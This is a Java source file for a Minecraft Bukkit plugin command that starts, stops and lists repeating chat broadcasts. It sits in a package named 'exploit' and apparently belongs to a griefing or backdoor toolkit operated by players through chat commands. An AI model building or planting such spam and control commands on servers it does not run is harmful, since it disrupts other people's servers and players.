package com.tmquan2508.exploit.commands;

import com.tmquan2508.exploit.Exploit;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;

import java.util.Arrays;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

public class SpamCommand extends Command {
    private final Map<Integer, BukkitTask> activeTasks = new ConcurrentHashMap<>();
    private final Map<Integer, String> activeTaskDetails = new ConcurrentHashMap<>();
    private int nextId = 0;

    public SpamCommand() { super(); }

    @Override public String getName() { return "spam"; }
    @Override public String getDescription() { return "Manages repeating message broadcast tasks."; }
    @Override public String getUsage() { return "<start|stop|list> [args...]"; }
    @Override public int getRequirePerm() { return 2; }

    @Override
    public void execute(Player sender, String[] args) {
        if (args.length < 1) {
            Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this));
            return;
        }

        String subCommand = args[0].toLowerCase();
        String[] subArgs = Arrays.copyOfRange(args, 1, args.length);

        switch (subCommand) {
            case "start":
                handleStart(sender, subArgs);
                break;
            case "stop":
                handleStop(sender, subArgs);
                break;
            case "list":
                handleList(sender);
                break;
            default:
                Exploit.sender.sendError(sender, Exploit.helpers.getRequiredUsage(this));
                break;
        }
    }

    private void handleStart(Player sender, String[] args) {
        if (args.length < 3) {
            Exploit.sender.sendError(sender, "Usage: " + Exploit.config.command_prefix + "spam start <amount> <delay_ticks> <message...>");
            Exploit.sender.sendWarn(sender, "Note: 20 ticks = 1 second.");
            return;
        }

        int amount;
        long delayInTicks;

        try {
            amount = Integer.parseInt(args[0]);
            delayInTicks = Long.parseLong(args[1]);
        } catch (NumberFormatException e) {
            Exploit.sender.sendError(sender, "Error: Amount and delay must be integers.");
            return;
        }

        if (amount <= 0 || delayInTicks < 0) {
            Exploit.sender.sendError(sender, "Error: Amount must be > 0, and delay must be >= 0.");
            return;
        }

        String message = String.join(" ", Arrays.copyOfRange(args, 2, args.length));
        final String finalMessage = ChatColor.translateAlternateColorCodes('&', message.replace("\\n", "\n"));
        final int taskId = ++nextId;

        BukkitTask task = new BukkitRunnable() {
            private int timesRun = 0;
            @Override public void run() {
                if (timesRun++ >= amount) {
                    activeTasks.remove(taskId);
                    activeTaskDetails.remove(taskId);
                    this.cancel();
                    return;
                }
                Bukkit.broadcastMessage(finalMessage);
            }
        }.runTaskTimer(Exploit.plugin, 0L, delayInTicks);

        String details = "Amount: " + amount + ", Delay: " + delayInTicks + "t, Message: \"" + message + "\"";
        activeTasks.put(taskId, task);
        activeTaskDetails.put(taskId, details);
        Exploit.sender.sendSuccess(sender, "Started spam task with ID: " + taskId);
    }

    private void handleStop(Player sender, String[] args) {
        if (args.length < 1) {
            Exploit.sender.sendError(sender, "Usage: " + Exploit.config.command_prefix + "spam stop <id>");
            return;
        }

        int id;
        try {
            id = Integer.parseInt(args[0]);
        } catch (NumberFormatException e) {
            Exploit.sender.sendError(sender, "Invalid ID: '" + args[0] + "'");
            return;
        }

        BukkitTask task = activeTasks.remove(id);
        activeTaskDetails.remove(id);

        if (task != null) {
            task.cancel();
            Exploit.sender.sendSuccess(sender, "Successfully stopped spam task with ID: " + id);
        } else {
            Exploit.sender.sendError(sender, "Error: Spam task with ID not found: " + id);
        }
    }

    private void handleList(Player sender) {
        if (activeTasks.isEmpty()) {
            Exploit.sender.sendMessage(sender, "No spam tasks are currently running.");
            return;
        }

        Exploit.sender.sendMessage(sender, ChatColor.GREEN + "Running spam tasks:");
        for (Map.Entry<Integer, String> entry : activeTaskDetails.entrySet()) {
            Exploit.sender.sendMessage(sender, ChatColor.YELLOW + " - ID: " + entry.getKey() + " | " + ChatColor.WHITE + entry.getValue());
        }
    }
}